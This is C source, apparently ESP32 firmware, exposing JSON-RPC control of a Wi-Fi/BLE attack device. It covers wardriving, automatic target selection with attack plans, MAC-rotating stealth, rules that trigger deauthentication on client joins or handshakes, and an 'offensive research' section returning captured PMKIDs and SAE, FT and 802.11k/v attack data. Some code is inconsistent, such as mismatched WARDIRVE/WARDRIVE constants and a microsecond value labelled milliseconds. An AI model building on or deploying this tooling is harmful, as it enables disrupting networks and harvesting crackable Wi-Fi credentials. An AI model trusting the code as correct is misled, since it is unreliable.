static esp_err_t rpc_ai_train_start(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    cJSON *mode_item = cJSON_GetObjectItem(root, "mode");
    if (mode_item == NULL || !cJSON_IsString(mode_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing mode", out, out_sz);
    }

    const char *mode_str = cJSON_GetStringValue(mode_item);
    ai_train_mode_t mode = AI_TRAIN_MODE_OFF;
    if (strcmp(mode_str, "wifi") == 0) mode = AI_TRAIN_MODE_WIFI;
    else if (strcmp(mode_str, "ble") == 0) mode = AI_TRAIN_MODE_BLE;
    else if (strcmp(mode_str, "both") == 0) mode = AI_TRAIN_MODE_BOTH;
    else {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "mode must be wifi|ble|both", out, out_sz);
    }

    esp_err_t rc = ai_train_start(mode);
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "train start failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"started\"", out, out_sz);
}

static esp_err_t rpc_ai_train_stop(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = ai_train_stop();
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "train stop failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"stopped\"", out, out_sz);
}

static esp_err_t rpc_ai_train_stats(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = ai_train_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "train stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_ai_train_status(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[128];
    const char *mode_str = "off";
    switch (ai_train_get_mode()) {
        case AI_TRAIN_MODE_WIFI: mode_str = "wifi"; break;
        case AI_TRAIN_MODE_BLE: mode_str = "ble"; break;
        case AI_TRAIN_MODE_BOTH: mode_str = "both"; break;
        default: mode_str = "off"; break;
    }
    snprintf(buf, sizeof(buf), "\"%s\"", mode_str);
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static wardrive_mode_t str_to_mode(const char *mode_str)
{
    if (mode_str == NULL) return WARDRIVE_MODE_OFF;
    if (strcmp(mode_str, "wifi") == 0) return WARDRIVE_MODE_WIFI;
    if (strcmp(mode_str, "ble") == 0)  return WARDRIVE_MODE_BLE;
    if (strcmp(mode_str, "both") == 0) return WARDRIVE_MODE_BOTH;
    return WARDRIVE_MODE_OFF;
}

static esp_err_t rpc_wardrive_start(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }
    cJSON *mode_item = cJSON_GetObjectItem(root, "mode");
    if (mode_item == NULL || !cJSON_IsString(mode_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing mode", out, out_sz);
    }
    const char *mode_str = cJSON_GetStringValue(mode_item);
    wardrive_mode_t mode = str_to_mode(mode_str);
    if (mode == WARDIRVE_MODE_OFF) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "mode must be wifi|ble|both", out, out_sz);
    }
    esp_err_t rc = wardrive_start(mode);
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "wardrive start failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"started\"", out, out_sz);
}

static esp_err_t rpc_wardrive_stop(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = wardrive_stop();
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "wardrive stop failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"stopped\"", out, out_sz);
}

static esp_err_t rpc_wardrive_stats(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = wardrive_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "wardrive stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_wardrive_status(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    const char *s = "off";
    switch (wardrive_get_mode()) {
        case WARDIRVE_MODE_WIFI: s = "wifi"; break;
        case WARDIRVE_MODE_BLE: s = "ble"; break;
        case WARDIRVE_MODE_BOTH: s = "both"; break;
        default: s = "off"; break;
    }
    char buf[32];
    snprintf(buf, sizeof(buf), "\"%s\"", s);
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_attack_plan(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }
    cJSON *idx_item = cJSON_GetObjectItem(root, "idx");
    if (idx_item == NULL || !cJSON_IsNumber(idx_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing idx", out, out_sz);
    }
    int ap_index = cJSON_GetNumberValue(idx_item);
    cJSON_Delete(root);

    attack_plan_t plan;
    esp_err_t rc = attack_planner_build_plan((uint32_t)ap_index, &plan);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "plan failed", out, out_sz);
    }
    cJSON *res = cJSON_CreateObject();
    cJSON_AddStringToObject(res, "bssid", plan.bssid);
    cJSON_AddStringToObject(res, "ssid", plan.ssid);
    cJSON_AddNumberToObject(res, "channel", plan.channel);
    cJSON_AddNumberToObject(res, "security", plan.security);
    cJSON_AddBoolToObject(res, "pmf_required", plan.pmf_required);
    cJSON_AddNumberToObject(res, "score", plan.score);
    cJSON_AddStringToObject(res, "warning", plan.warning);
    cJSON *steps = cJSON_CreateArray();
    for (uint8_t i = 0; i < plan.step_count; i++) {
        cJSON_AddItemToArray(steps, cJSON_CreateString(attack_step_name(plan.steps[i])));
    }
    cJSON_AddItemToObject(res, "steps", steps);
    cJSON_AddStringToObject(res, "summary", plan.summary);
    char *printed = cJSON_PrintUnformatted(res);
    esp_err_t rc2 = jsonrpc_send_result(-1, printed, out, out_sz);
    cJSON_Delete(res);
    cJSON_free(printed);
    return rc2;
}

static esp_err_t rpc_attack_best(const char *method, const char *params_json,
                                char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    uint32_t best_idx = 0;
    esp_err_t rc = attack_planner_best_target(&best_idx);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "no target found", out, out_sz);
    }

    ap_info_t ap;
    rc = wifi_sniffer_get_ap(best_idx, &ap);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "ap fetch failed", out, out_sz);
    }

    char bssid[18];
    snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
             ap.bssid[0], ap.bssid[1], ap.bssid[2],
             ap.bssid[3], ap.bssid[4], ap.bssid[5]);

    attack_plan_t plan;
    rc = attack_planner_build_plan(best_idx, &plan);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "plan failed", out, out_sz);
    }

    cJSON *res = cJSON_CreateObject();
    cJSON_AddStringToObject(res, "bssid", bssid);
    cJSON_AddStringToObject(res, "ssid", ap.ssid);
    cJSON_AddNumberToObject(res, "channel", ap.channel);
    cJSON_AddNumberToObject(res, "score", plan.score);
    cJSON_AddStringToObject(res, "summary", plan.summary);
    char *printed = cJSON_PrintUnformatted(res);
    esp_err_t rc2 = jsonrpc_send_result(-1, printed, out, out_sz);
    cJSON_Delete(res);
    cJSON_free(printed);
    return rc2;
}

static esp_err_t rpc_attack_stats(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[256];
    esp_err_t rc = attack_planner_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "stats failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_stealth_set_mode(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }
    cJSON *mode_item = cJSON_GetObjectItem(root, "mode");
    if (mode_item == NULL || !cJSON_IsString(mode_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing mode", out, out_sz);
    }
    const char *mode_str = cJSON_GetStringValue(mode_item);
    stealth_mode_t mode = STEALTH_MODE_OFF;
    if (strcmp(mode_str, "passive") == 0) mode = STEALTH_MODE_PASSIVE;
    else if (strcmp(mode_str, "active") == 0) mode = STEALTH_MODE_ACTIVE;
    else if (strcmp(mode_str, "off") == 0) mode = STEALTH_MODE_OFF;
    else {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "mode must be off|passive|active", out, out_sz);
    }
    esp_err_t rc = stealth_set_mode(mode);
    cJSON_Delete(root);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "stealth set_mode failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

static esp_err_t rpc_stealth_rotate(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = stealth_set_random_mac();
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "rotate failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"rotated\"", out, out_sz);
}

static esp_err_t rpc_stealth_status(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[128];
    esp_err_t rc = stealth_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "stealth status failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_scheduler_add(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }
    sched_entry_t entry;
    memset(&entry, 0, sizeof(entry));
    entry.enabled = true;

    cJSON *min = cJSON_GetObjectItem(root, "minute");
    if (min != NULL && cJSON_IsNumber(min)) entry.minute = (uint8_t)cJSON_GetNumberValue(min);

    cJSON *hr = cJSON_GetObjectItem(root, "hour");
    if (hr != NULL && cJSON_IsNumber(hr)) entry.hour = (uint8_t)cJSON_GetNumberValue(hr);

    cJSON *dow = cJSON_GetObjectItem(root, "day_of_week");
    if (dow != NULL && cJSON_IsNumber(dow)) entry.day_of_week = (uint8_t)cJSON_GetNumberValue(dow);

    cJSON *act = cJSON_GetObjectItem(root, "action");
    if (act != NULL && cJSON_IsString(act)) {
        const char *as = cJSON_GetStringValue(act);
        if (strcmp(as, "wifi_start") == 0) entry.action = SCHED_ACTION_WIFI_START;
        else if (strcmp(as, "wifi_stop") == 0) entry.action = SCHED_ACTION_WIFI_STOP;
        else if (strcmp(as, "stealth") == 0) entry.action = SCHED_ACTION_STEALTH_SET_MODE;
        else if (strcmp(as, "wardrive_start") == 0) entry.action = SCHED_ACTION_WARDRIVE_START;
        else if (strcmp(as, "wardrive_stop") == 0) entry.action = SCHED_ACTION_WARDRIVE_STOP;
        else if (strcmp(as, "train_start") == 0) entry.action = SCHED_ACTION_AI_TRAIN_START;
        else if (strcmp(as, "train_stop") == 0) entry.action = SCHED_ACTION_AI_TRAIN_STOP;
        else if (strcmp(as, "jsonrpc") == 0) entry.action = SCHED_ACTION_CUSTOM_JSONRPC;
    }

    cJSON *params = cJSON_GetObjectItem(root, "params");
    if (params != NULL && cJSON_IsString(params)) {
        strncpy(entry.params, cJSON_GetStringValue(params), sizeof(entry.params) - 1);
        entry.params[sizeof(entry.params) - 1] = '\0';
    }

    int idx = scheduler_add(&entry);
    cJSON_Delete(root);
    if (idx < 0) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "scheduler add failed", out, out_sz);
    }
    cJSON *res = cJSON_CreateNumber((double)idx);
    char *printed = cJSON_PrintUnformatted(res);
    esp_err_t rc = jsonrpc_send_result(-1, printed, out, out_sz);
    cJSON_Delete(res);
    cJSON_free(printed);
    return rc;
}

static esp_err_t rpc_scheduler_remove(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }
    cJSON *idx_item = cJSON_GetObjectItem(root, "idx");
    if (idx_item == NULL || !cJSON_IsNumber(idx_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing idx", out, out_sz);
    }
    int idx = (int)cJSON_GetNumberValue(idx_item);
    cJSON_Delete(root);
    esp_err_t rc = scheduler_remove((uint8_t)idx);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "remove failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"removed\"", out, out_sz);
}

static esp_err_t rpc_scheduler_update(const char *method, const char *params_json,
                                     char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }
    cJSON *idx_item = cJSON_GetObjectItem(root, "idx");
    if (idx_item == NULL || !cJSON_IsNumber(idx_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing idx", out, out_sz);
    }
    int idx = (int)cJSON_GetNumberValue(idx_item);

    sched_entry_t entry;
    memset(&entry, 0, sizeof(entry));
    entry.enabled = true;

    cJSON *min = cJSON_GetObjectItem(root, "minute");
    if (min != NULL && cJSON_IsNumber(min)) entry.minute = (uint8_t)cJSON_GetNumberValue(min);

    cJSON *hr = cJSON_GetObjectItem(root, "hour");
    if (hr != NULL && cJSON_IsNumber(hr)) entry.hour = (uint8_t)cJSON_GetNumberValue(hr);

    cJSON *dow = cJSON_GetObjectItem(root, "day_of_week");
    if (dow != NULL && cJSON_IsNumber(dow)) entry.day_of_week = (uint8_t)cJSON_GetNumberValue(dow);

    cJSON *act = cJSON_GetObjectItem(root, "action");
    if (act != NULL && cJSON_IsString(act)) {
        const char *as = cJSON_GetStringValue(act);
        if (strcmp(as, "wifi_start") == 0) entry.action = SCHED_ACTION_WIFI_START;
        else if (strcmp(as, "wifi_stop") == 0) entry.action = SCHED_ACTION_WIFI_STOP;
        else if (strcmp(as, "stealth") == 0) entry.action = SCHED_ACTION_STEALTH_SET_MODE;
        else if (strcmp(as, "wardrive_start") == 0) entry.action = SCHED_ACTION_WARDRIVE_START;
        else if (strcmp(as, "wardrive_stop") == 0) entry.action = SCHED_ACTION_WARDRIVE_STOP;
        else if (strcmp(as, "train_start") == 0) entry.action = SCHED_ACTION_AI_TRAIN_START;
        else if (strcmp(as, "train_stop") == 0) entry.action = SCHED_ACTION_AI_TRAIN_STOP;
        else if (strcmp(as, "jsonrpc") == 0) entry.action = SCHED_ACTION_CUSTOM_JSONRPC;
    }

    cJSON *params = cJSON_GetObjectItem(root, "params");
    if (params != NULL && cJSON_IsString(params)) {
        strncpy(entry.params, cJSON_GetStringValue(params), sizeof(entry.params) - 1);
        entry.params[sizeof(entry.params) - 1] = '\0';
    }

    cJSON_Delete(root);
    esp_err_t rc = scheduler_update((uint8_t)idx, &entry);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "update failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"updated\"", out, out_sz);
}

static esp_err_t rpc_scheduler_list(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[1024];
    esp_err_t rc = scheduler_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "list failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

static esp_err_t rpc_scheduler_save(const char *method, const char *params_json,
                                   char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = scheduler_save();
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "save failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"saved\"", out, out_sz);
}


/*============================================================================*/
static esp_err_t rpc_reaction_add(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }
    reaction_rule_t rule;
    memset(&rule, 0, sizeof(rule));
    rule.enabled = true;

    cJSON *trig = cJSON_GetObjectItem(root, "trigger");
    if (trig != NULL && cJSON_IsString(trig)) {
        const char *ts = cJSON_GetStringValue(trig);
        if (strcmp(ts, "ap_seen") == 0) rule.trigger = REACTION_TRIG_AP_SEEN;
        else if (strcmp(ts, "client_join") == 0) rule.trigger = REACTION_TRIG_CLIENT_JOIN;
        else if (strcmp(ts, "anomaly_high") == 0) rule.trigger = REACTION_TRIG_ANOMALY_HIGH;
        else if (strcmp(ts, "ble_seen") == 0) rule.trigger = REACTION_TRIG_BLE_SEEN;
        else if (strcmp(ts, "handshake") == 0) rule.trigger = REACTION_TRIG_HANDSHAKE;
        else if (strcmp(ts, "rogue_ap") == 0) rule.trigger = REACTION_TRIG_ROGUE_AP;
    }

    cJSON *act = cJSON_GetObjectItem(root, "action");
    if (act != NULL && cJSON_IsString(act)) {
        const char *as = cJSON_GetStringValue(act);
        if (strcmp(as, "deauth") == 0) rule.action = REACTION_ACT_DEAUTH;
        else if (strcmp(as, "wardrive") == 0) rule.action = REACTION_ACT_WARDRIVE_START;
        else if (strcmp(as, "stealth_passive") == 0) rule.action = REACTION_ACT_STEALTH_PASSIVE;
        else if (strcmp(as, "train_start") == 0) rule.action = REACTION_ACT_TRAIN_START;
        else if (strcmp(as, "train_stop") == 0) rule.action = REACTION_ACT_TRAIN_STOP;
        else if (strcmp(as, "alert") == 0) rule.action = REACTION_ACT_ALERT;
    }

    cJSON *param = cJSON_GetObjectItem(root, "param");
    if (param != NULL && cJSON_IsString(param)) {
        strncpy((char *)rule.param, cJSON_GetStringValue(param), sizeof(rule.param) - 1);
        rule.param[sizeof(rule.param) - 1] = '\0';
    }

    cJSON *action_param = cJSON_GetObjectItem(root, "action_param");
    if (action_param != NULL && cJSON_IsString(action_param)) {
        strncpy((char *)rule.action_param, cJSON_GetStringValue(action_param), sizeof(rule.action_param) - 1);
        rule.action_param[sizeof(rule.action_param) - 1] = '\0';
    }

    int idx = reaction_rules_add(&rule);
    cJSON_Delete(root);
    if (idx < 0) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "reaction add failed", out, out_sz);
    }
    cJSON *res = cJSON_CreateNumber((double)idx);
    char *printed = cJSON_PrintUnformatted(res);
    esp_err_t rc = jsonrpc_send_result(-1, printed, out, out_sz);
    cJSON_Delete(res);
    cJSON_free(printed);
    return rc;
}

static esp_err_t rpc_reaction_remove(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }
    cJSON *idx_item = cJSON_GetObjectItem(root, "idx");
    if (idx_item == NULL || !cJSON_IsNumber(idx_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing idx", out, out_sz);
    }
    int idx = (int)cJSON_GetNumberValue(idx_item);
    cJSON_Delete(root);
    esp_err_t rc = reaction_rules_remove((uint8_t)idx);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "remove failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"removed\"", out, out_sz);
}

static esp_err_t rpc_reaction_list(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    char buf[1024];
    esp_err_t rc = reaction_rules_json(buf, sizeof(buf));
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "list failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, buf, out, out_sz);
}

/*============================================================================*/
static esp_err_t rpc_export_start(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }
    cJSON *mode_item = cJSON_GetObjectItem(root, "mode");
    if (mode_item == NULL || !cJSON_IsString(mode_item)) {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "missing mode", out, out_sz);
    }
    const char *mode_str = cJSON_GetStringValue(mode_item);
    export_mode_t mode = EXPORT_MODE_OFF;
    if (strcmp(mode_str, "pcap") == 0) mode = EXPORT_MODE_PCAP;
    else if (strcmp(mode_str, "pcapng") == 0) mode = EXPORT_MODE_PCAP_NG;
    else if (strcmp(mode_str, "netxml") == 0) mode = EXPORT_MODE_NETXML;
    else if (strcmp(mode_str, "csv") == 0) mode = EXPORT_MODE_CSV;
    else if (strcmp(mode_str, "jsonl") == 0) mode = EXPORT_MODE_JSONL;
    else if (strcmp(mode_str, "zstd") == 0) mode = EXPORT_MODE_ZST;
    else {
        cJSON_Delete(root);
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "mode must be pcap|pcapng|netxml|csv|jsonl|zstd", out, out_sz);
    }
    cJSON *path_item = cJSON_GetObjectItem(root, "path");
    const char *path = "/sd/export.pcap";
    if (path_item != NULL && cJSON_IsString(path_item)) {
        path = cJSON_GetStringValue(path_item);
    }
    cJSON_Delete(root);
    esp_err_t rc = export_start(mode, path);
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "export start failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"started\"", out, out_sz);
}

static esp_err_t rpc_export_stop(const char *method, const char *params_json,
                                    char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    esp_err_t rc = export_stop();
    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "export stop failed", out, out_sz);
    }
    return jsonrpc_send_result(-1, "\"stopped\"", out, out_sz);
}

/* ============================================================================
 *  OFFENSIVE RESEARCH RPC METHODS
 *  FIXED: Added user_ctx parameter to match jsonrpc_method_entry_t signature
 *  FIXED: Properly escaped JSON strings
 * ============================================================================ */

static esp_err_t rpc_offensive_set_mode(const char *method, const char *params_json,
                                         char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    uint32_t mask = 0;
    if (params_json && strlen(params_json) > 0) {
        char *end = NULL;
        mask = (uint32_t)strtoul(params_json, &end, 0);
    }
    offensive_set_mode(mask);
    snprintf(out, outsz, "{\"mode\":\"0x%08" PRIx32 "\"}", offensive_get_mode());
    return ESP_OK;
}

static esp_err_t rpc_offensive_get_mode(const char *method, const char *params_json,
                                         char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    snprintf(out, outsz, "{\"mode\":\"0x%08" PRIx32 "\"}", offensive_get_mode());
    return ESP_OK;
}

static esp_err_t rpc_offensive_pmkid(const char *method, const char *params_json,
                                     char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    off_pmkid_t pmkid;
    if (offensive_get_pmkid(&pmkid) != ESP_OK || !pmkid.valid) {
        snprintf(out, outsz, "{\"error\":\"no_pmkid\"}");
        return ESP_ERR_NOT_FOUND;
    }
    snprintf(out, outsz, "{\"ap_bssid\":\"" MACSTR "\",\"pmkid\":\"", MAC2STR(pmkid.ap_bssid));
    for (int i = 0; i < 16 && i < (int)outsz - 8; i++) {
        int n = strlen(out);
        snprintf(out + n, outsz - n, "%02x", pmkid.pmkid[i]);
    }
    int n = strlen(out);
    snprintf(out + n, outsz - n, "\"}");
    return ESP_OK;
}

static esp_err_t rpc_offensive_sae(const char *method, const char *params_json,
                                   char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    off_sae_timing_t t;
    offensive_get_sae_timing(&t);
    snprintf(out, outsz,
        "{\"delta_ms\":%" PRIu32 ",\"ap_bssid\":\"" MACSTR "\"}",
        t.delta_us, MAC2STR(t.ap_bssid));
    return ESP_OK;
}

static esp_err_t rpc_offensive_dragonfly(const char *method, const char *params_json,
                                         char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    off_dragonfly_t d;
    if (offensive_get_dragonfly(&d) != ESP_OK || !d.valid) {
        snprintf(out, outsz, "{\"error\":\"no_dragonfly\"}");
        return ESP_ERR_NOT_FOUND;
    }
    snprintf(out, outsz,
        "{\"ap_bssid\":\"" MACSTR "\",\"ssid\":\"%s\"}",
        MAC2STR(d.ap_bssid), d.ssid);
    return ESP_OK;
}

static esp_err_t rpc_offensive_ft(const char *method, const char *params_json,
                                  char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    off_ft_t ft;
    if (offensive_get_ft(&ft) != ESP_OK || !ft.valid) {
        snprintf(out, outsz, "{\"error\":\"no_ft\"}");
        return ESP_ERR_NOT_FOUND;
    }
    snprintf(out, outsz,
        "{\"ap_bssid\":\"" MACSTR "\",\"sta_mac\":\"" MACSTR "\","
        "\"reassoc_ms\":%" PRIu32 "}",
        MAC2STR(ft.ap_bssid), MAC2STR(ft.sta_mac), ft.reassoc_time_us);
    return ESP_OK;
}

static esp_err_t rpc_offensive_11k(const char *method, const char *params_json,
                                   char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    off_11k_t k;
    offensive_get_11k(&k);
    snprintf(out, outsz,
        "{\"target_bssid\":\"" MACSTR "\",\"neighbor_bssid\":\"" MACSTR "\","
        "\"channel\":%d}",
        MAC2STR(k.target_bssid), MAC2STR(k.neighbor_bssid), k.channel);
    return ESP_OK;
}

static esp_err_t rpc_offensive_11v(const char *method, const char *params_json,
                                   char *out, size_t outsz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    off_11v_t v;
    offensive_get_11v(&v);
    snprintf(out, outsz,
        "{\"ap_bssid\":\"" MACSTR "\",\"target_bssid\":\"" MACSTR "\","
        "\"disassoc_timer\":%d}",
        MAC2STR(v.ap_bssid), MAC2STR(v.target_bssid), v.disassoc_timer);
    return ESP_OK;
}
